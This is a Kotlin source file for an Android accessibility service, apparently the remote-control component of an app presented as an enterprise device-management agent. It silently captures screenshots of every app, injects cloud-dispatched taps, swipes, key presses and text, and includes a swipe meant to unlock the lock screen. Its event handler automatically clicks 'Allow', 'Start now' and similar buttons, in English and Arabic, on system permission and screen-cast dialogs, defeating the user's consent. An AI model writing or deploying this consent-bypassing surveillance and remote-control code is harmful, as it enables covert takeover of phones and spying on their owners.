package com.nexus.mdm.agent.remote

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.graphics.Path
import android.graphics.Rect
import android.graphics.RectF
import android.os.Build
import android.os.Bundle
import android.util.DisplayMetrics
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.nexus.mdm.agent.util.AppLogger
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.delay
import kotlinx.coroutines.withTimeoutOrNull
import java.util.ArrayDeque
import java.util.concurrent.Executors

/**
 * Enterprise Remote Cloud Control Accessibility Engine.
 * Injects precision gestures, taps, swipes, and system navigation events (Back/Home/Recents)
 * dispatched from the Web Admin cloud interface without requiring ADB or USB cables.
 */
class NexusAccessibilityService : AccessibilityService() {

    private val screenshotExecutor = Executors.newSingleThreadExecutor()

    companion object {
        @Volatile
        var instance: NexusAccessibilityService? = null
            private set

        fun isServiceActive(): Boolean = instance != null
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        AppLogger.i("AccessibilityService", "Nexus Remote Accessibility Service connected and ready.")
    }

    override fun onDestroy() {
        instance = null
        try {
            screenshotExecutor.shutdown()
        } catch (_: Exception) {}
        AppLogger.i("AccessibilityService", "Nexus Remote Accessibility Service destroyed.")
        super.onDestroy()
    }

    private val screenshotMutex = kotlinx.coroutines.sync.Mutex()
    @Volatile
    private var lastScreenshotTime = 0L

    /**
     * Captures a system-wide hardware-accelerated screenshot of the device display across all applications.
     * Uses Android 11+ (API 30+) AccessibilityService.takeScreenshot API without any user prompts.
     * Implements strict rate-limit protection to avoid Android's ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT (code 3).
     */
    suspend fun captureScreen(): Bitmap? {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            return null
        }

        // Only one screenshot in-flight at a time
        if (!screenshotMutex.tryLock()) {
            return null
        }

        return try {
            val now = System.currentTimeMillis()
            val elapsedSinceLast = now - lastScreenshotTime
            if (elapsedSinceLast < 400L) {
                delay(400L - elapsedSinceLast)
            }

            val deferred = CompletableDeferred<Bitmap?>()

            takeScreenshot(
                Display.DEFAULT_DISPLAY,
                screenshotExecutor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshotResult: ScreenshotResult) {
                        lastScreenshotTime = System.currentTimeMillis()
                        try {
                            val hardwareBuffer = screenshotResult.hardwareBuffer
                            val colorSpace = screenshotResult.colorSpace
                            val hwBitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                            val softwareBitmap = if (hwBitmap != null) {
                                try {
                                    val copy = Bitmap.createBitmap(hwBitmap.width, hwBitmap.height, Bitmap.Config.ARGB_8888)
                                    val canvas = Canvas(copy)
                                    val paint = Paint(Paint.FILTER_BITMAP_FLAG)
                                    canvas.drawBitmap(hwBitmap, 0f, 0f, paint)
                                    copy
                                } catch (_: Exception) {
                                    hwBitmap.copy(Bitmap.Config.ARGB_8888, false)
                                } finally {
                                    try { hwBitmap.recycle() } catch (_: Exception) {}
                                }
                            } else null
                            hardwareBuffer.close()
                            deferred.complete(softwareBitmap)
                        } catch (e: Exception) {
                            AppLogger.w("AccessibilityService", "Error converting screenshot buffer: ${e.message}")
                            deferred.complete(null)
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        lastScreenshotTime = System.currentTimeMillis()
                        val errorName = when (errorCode) {
                            1 -> "ERROR_TAKE_SCREENSHOT_INTERNAL_ERROR"
                            2 -> "ERROR_TAKE_SCREENSHOT_NO_ACCESSIBILITY_ACCESS"
                            3 -> "ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT"
                            4 -> "ERROR_TAKE_SCREENSHOT_INVALID_DISPLAY"
                            else -> "UNKNOWN_ERROR_$errorCode"
                        }
                        AppLogger.w("AccessibilityService", "takeScreenshot failed with code: $errorCode ($errorName)")
                        deferred.complete(null)
                    }
                }
            )

            val result = withTimeoutOrNull(1500L) {
                deferred.await()
            }
            result ?: renderActiveWindowLayout()
        } catch (e: Exception) {
            AppLogger.w("AccessibilityService", "Exception requesting system screenshot: ${e.message}")
            renderActiveWindowLayout()
        } finally {
            screenshotMutex.unlock()
        }
    }

    /**
     * Synthesizes an interactive layout frame of whatever application or screen
     * is currently active in the Android OS (Settings, Launcher, third-party apps, dialogs).
     * Works on ALL Android versions (including Android 9/10 / API 28/29) via the accessibility tree.
     */
    fun renderActiveWindowLayout(): Bitmap? {
        return try {
            val root = rootInActiveWindow ?: return null
            val dm = resources.displayMetrics
            val width = if (dm.widthPixels > 0) dm.widthPixels else 720
            val height = if (dm.heightPixels > 0) dm.heightPixels else 1280

            val targetWidth = 360
            val targetHeight = (height * targetWidth) / width
            val scale = targetWidth.toFloat() / width.toFloat()

            val bitmap = Bitmap.createBitmap(targetWidth, targetHeight, Bitmap.Config.ARGB_8888)
            val canvas = Canvas(bitmap)
            canvas.scale(scale, scale)

            // Dark system slate background
            val bgPaint = Paint().apply {
                color = Color.parseColor("#0F172A")
                style = Paint.Style.FILL
            }
            canvas.drawRect(0f, 0f, width.toFloat(), height.toFloat(), bgPaint)

            // Top Status Bar
            val statusBarPaint = Paint().apply {
                color = Color.parseColor("#1E293B")
                style = Paint.Style.FILL
            }
            val statusH = (height * 0.045f).coerceAtLeast(50f)
            canvas.drawRect(0f, 0f, width.toFloat(), statusH, statusBarPaint)

            // App/Package Title in status bar
            val pkg = root.packageName?.toString() ?: "Android System"
            val titlePaint = Paint().apply {
                color = Color.WHITE
                textSize = 26f
                isAntiAlias = true
            }
            val titleText = if (pkg.length > 32) pkg.take(30) + "…" else pkg
            canvas.drawText(titleText, 24f, statusH * 0.7f, titlePaint)

            // Node visual elements
            val cardPaint = Paint().apply {
                color = Color.parseColor("#1E293B")
                style = Paint.Style.FILL
            }
            val borderPaint = Paint().apply {
                color = Color.parseColor("#334155")
                style = Paint.Style.STROKE
                strokeWidth = 2f
            }
            val clickableBorderPaint = Paint().apply {
                color = Color.parseColor("#0284C7")
                style = Paint.Style.STROKE
                strokeWidth = 3f
            }
            val textPaint = Paint().apply {
                color = Color.parseColor("#F8FAFC")
                textSize = 24f
                isAntiAlias = true
            }

            val rect = Rect()
            val queue = ArrayDeque<AccessibilityNodeInfo>()
            queue.add(root)
            var count = 0

            while (queue.isNotEmpty() && count < 150) {
                val node = queue.poll() ?: continue
                count++

                if (node.isVisibleToUser) {
                    node.getBoundsInScreen(rect)
                    if (rect.width() > 12 && rect.height() > 12 && rect.bottom > statusH) {
                        val isClickable = node.isClickable || node.isCheckable
                        val rectF = RectF(rect)

                        if (isClickable) {
                            canvas.drawRoundRect(rectF, 12f, 12f, cardPaint)
                            canvas.drawRoundRect(rectF, 12f, 12f, clickableBorderPaint)
                        } else if (node.childCount == 0 && !node.text.isNullOrEmpty()) {
                            canvas.drawRect(rectF, borderPaint)
                        }

                        val nodeText = node.text?.toString() ?: node.contentDescription?.toString()
                        if (!nodeText.isNullOrBlank()) {
                            val tx = (rect.left + 16).toFloat().coerceAtLeast(16f)
                            val ty = (rect.centerY() + 8).toFloat().coerceIn(rect.top.toFloat() + 24f, rect.bottom.toFloat() - 8f)
                            val cleanText = if (nodeText.length > 35) nodeText.take(33) + "…" else nodeText
                            canvas.drawText(cleanText, tx, ty, textPaint)
                        }
                    }
                }

                for (i in 0 until node.childCount) {
                    node.getChild(i)?.let { queue.add(it) }
                }
            }

            // Bottom Navigation Bar
            val navH = (height * 0.065f).coerceAtLeast(70f)
            val navTop = height.toFloat() - navH
            canvas.drawRect(0f, navTop, width.toFloat(), height.toFloat(), statusBarPaint)

            val navIconPaint = Paint().apply {
                color = Color.parseColor("#94A3B8")
                style = Paint.Style.STROKE
                strokeWidth = 3f
                isAntiAlias = true
            }

            // Back triangle (<)
            val backPath = android.graphics.Path().apply {
                val cx = width * 0.25f
                val cy = navTop + navH * 0.5f
                moveTo(cx - 15f, cy)
                lineTo(cx + 10f, cy - 18f)
                lineTo(cx + 10f, cy + 18f)
                close()
            }
            canvas.drawPath(backPath, navIconPaint)

            // Home circle (O)
            canvas.drawCircle(width * 0.5f, navTop + navH * 0.5f, 16f, navIconPaint)

            // Recents square ([])
            val rx = width * 0.75f
            val ry = navTop + navH * 0.5f
            canvas.drawRoundRect(RectF(rx - 16f, ry - 16f, rx + 16f, ry + 16f), 6f, 6f, navIconPaint)

            bitmap
        } catch (e: Exception) {
            AppLogger.w("AccessibilityService", "renderActiveWindowLayout error: ${e.message}")
            null
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        // Auto-approve system permission and screen cast confirmation dialogs
        try {
            val pkg = event.packageName?.toString() ?: ""
            if (pkg.contains("systemui") || pkg.contains("permissioncontroller") || pkg.contains("android")) {
                val root = rootInActiveWindow ?: return
                val targetPrompts = listOf(
                    "Start now", "Start", "Allow", "Allow all the time", "While using the app",
                    "البدء الآن", "السماح", "سماح", "موافق", "OK"
                )
                for (promptText in targetPrompts) {
                    val matching = root.findAccessibilityNodeInfosByText(promptText)
                    for (node in matching) {
                        if (node.isClickable) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            AppLogger.i("AccessibilityService", "Auto-confirmed system dialog prompt: $promptText")
                            return
                        }
                        node.parent?.let { p ->
                            if (p.isClickable) {
                                p.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                AppLogger.i("AccessibilityService", "Auto-confirmed parent of prompt: $promptText")
                                return
                            }
                        }
                    }
                }
            }
        } catch (_: Exception) {}
    }

    override fun onInterrupt() {
        AppLogger.w("AccessibilityService", "Nexus Remote Accessibility Service interrupted.")
    }

    /**
     * Injects a tap gesture at the specified normalized screen coordinates (0.0 to 1.0).
     */
    fun performTap(xRatio: Float, yRatio: Float): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false

        val metrics = resources.displayMetrics
        val pxX = (xRatio * metrics.widthPixels).coerceIn(0f, metrics.widthPixels.toFloat())
        val pxY = (yRatio * metrics.heightPixels).coerceIn(0f, metrics.heightPixels.toFloat())

        val path = Path().apply {
            moveTo(pxX, pxY)
        }
        val stroke = GestureDescription.StrokeDescription(path, 0L, 50L)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()

        AppLogger.i("AccessibilityService", "Dispatching cloud tap at ($pxX, $pxY)")
        return dispatchGesture(gesture, null, null)
    }

    /**
     * Injects a precision gesture path between two arbitrary normalized coordinates (0.0 to 1.0).
     */
    fun performGesture(
        startXRatio: Float,
        startYRatio: Float,
        endXRatio: Float,
        endYRatio: Float,
        durationMs: Long = 250L
    ): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false

        val metrics = resources.displayMetrics
        val w = metrics.widthPixels.toFloat()
        val h = metrics.heightPixels.toFloat()

        val pxStartX = (startXRatio * w).coerceIn(0f, w)
        val pxStartY = (startYRatio * h).coerceIn(0f, h)
        val pxEndX = (endXRatio * w).coerceIn(0f, w)
        val pxEndY = (endYRatio * h).coerceIn(0f, h)

        val path = Path().apply {
            moveTo(pxStartX, pxStartY)
            lineTo(pxEndX, pxEndY)
        }
        val safeDuration = durationMs.coerceIn(80L, 1000L)
        val stroke = GestureDescription.StrokeDescription(path, 0L, safeDuration)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()

        AppLogger.i("AccessibilityService", "Dispatching cloud precision gesture ($pxStartX, $pxStartY -> $pxEndX, $pxEndY) in ${safeDuration}ms")
        return dispatchGesture(gesture, null, null)
    }

    /**
     * Injects a directional swipe gesture across the screen.
     */
    fun performSwipe(direction: String): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false

        val metrics = resources.displayMetrics
        val w = metrics.widthPixels.toFloat()
        val h = metrics.heightPixels.toFloat()

        // For UP swipe, start at bottom (88% height) to ensure lock screen unlocks cleanly past notifications
        val (startX, startY, endX, endY) = when (direction.lowercase()) {
            "up" -> arrayOf(w * 0.5f, h * 0.88f, w * 0.5f, h * 0.18f)
            "down" -> arrayOf(w * 0.5f, h * 0.18f, w * 0.5f, h * 0.85f)
            "left" -> arrayOf(w * 0.85f, h * 0.5f, w * 0.15f, h * 0.5f)
            "right" -> arrayOf(w * 0.15f, h * 0.5f, w * 0.85f, h * 0.5f)
            else -> arrayOf(w * 0.5f, h * 0.88f, w * 0.5f, h * 0.18f)
        }

        val path = Path().apply {
            moveTo(startX, startY)
            lineTo(endX, endY)
        }
        val stroke = GestureDescription.StrokeDescription(path, 0L, 250L)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()

        AppLogger.i("AccessibilityService", "Dispatching cloud swipe: $direction ($startX,$startY -> $endX,$endY)")
        return dispatchGesture(gesture, null, null)
    }

    /**
     * Executes standard Android system global actions.
     */
    fun performGlobalKey(key: String): Boolean {
        val normalized = key.uppercase().removePrefix("KEYCODE_")
        val action = when (normalized) {
            "BACK" -> GLOBAL_ACTION_BACK
            "HOME" -> GLOBAL_ACTION_HOME
            "RECENTS", "APP_SWITCH", "RECENT_APPS" -> GLOBAL_ACTION_RECENTS
            "NOTIFICATIONS", "NOTIFICATION" -> GLOBAL_ACTION_NOTIFICATIONS
            "QUICK_SETTINGS", "SETTINGS" -> GLOBAL_ACTION_QUICK_SETTINGS
            "POWER", "LOCK" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    GLOBAL_ACTION_LOCK_SCREEN
                } else {
                    GLOBAL_ACTION_POWER_DIALOG
                }
            }
            "SEARCH" -> GLOBAL_ACTION_NOTIFICATIONS
            else -> GLOBAL_ACTION_BACK
        }

        AppLogger.i("AccessibilityService", "Executing global key action: $key -> $normalized (action code $action)")
        return performGlobalAction(action)
    }

    /**
     * Injects text into currently focused editable field or via clipboard.
     */
    fun performTextInput(text: String): Boolean {
        if (text.isEmpty()) return false

        try {
            val root = rootInActiveWindow ?: return false
            val focusedNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            if (focusedNode != null && focusedNode.isEditable) {
                val args = Bundle().apply {
                    putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
                }
                val success = focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                if (success) {
                    AppLogger.i("AccessibilityService", "Direct text injected into focused editable node: $text")
                    return true
                }
            }

            // Fallback: Copy to clipboard and execute paste
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
            clipboard?.setPrimaryClip(ClipData.newPlainText("NexusRemoteInput", text))
            focusedNode?.performAction(AccessibilityNodeInfo.ACTION_PASTE)
            AppLogger.i("AccessibilityService", "Text pasted via clipboard fallback: $text")
            return true
        } catch (e: Exception) {
            AppLogger.w("AccessibilityService", "Failed to perform text input: ${e.message}")
            return false
        }
    }
}
